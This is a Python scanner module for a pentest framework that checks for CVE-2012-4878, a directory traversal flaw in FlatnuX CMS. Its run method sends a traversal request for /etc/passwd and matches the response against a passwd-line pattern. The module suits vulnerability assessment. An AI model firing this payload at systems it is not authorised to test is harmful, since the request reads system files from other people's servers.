#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A path traversal vulnerability in controlcenter."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'FlatnuX CMS - Directory Traversal Detection',
        'description': 'A path traversal vulnerability in controlcenter.php in FlatnuX CMS 2011 08.09.2 allows remote administrators to read arbitrary files via a full pathname in the dir parameter in a contents/Files action.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2012', 'lfi', 'traversal', 'edb', 'packetstorm', 'flatnux', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/37034',
            'https://nvd.nist.gov/vuln/detail/CVE-2012-4878',
            'http://www.vulnerability-lab.com/get_content.php?id=487',
            'http://packetstormsecurity.org/files/111473/Flatnux-CMS-2011-08.09.2-CSRF-XSS-Directory-Traversal.html',
            'https://exchange.xforce.ibmcloud.com/vulnerabilities/74568',
        ],
        'cve': 'CVE-2012-4878',
    }

    def run(self):
        r = self.http_request(method="GET", path='/controlcenter.php?opt=contents/Files&dir=%2Fetc&ffile=passwd&opmod=open', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="FlatnuX CMS - Directory Traversal detected",
                path='/controlcenter.php?opt=contents/Files&dir=%2Fetc&ffile=passwd&opmod=open',
            )
            return True
        return False

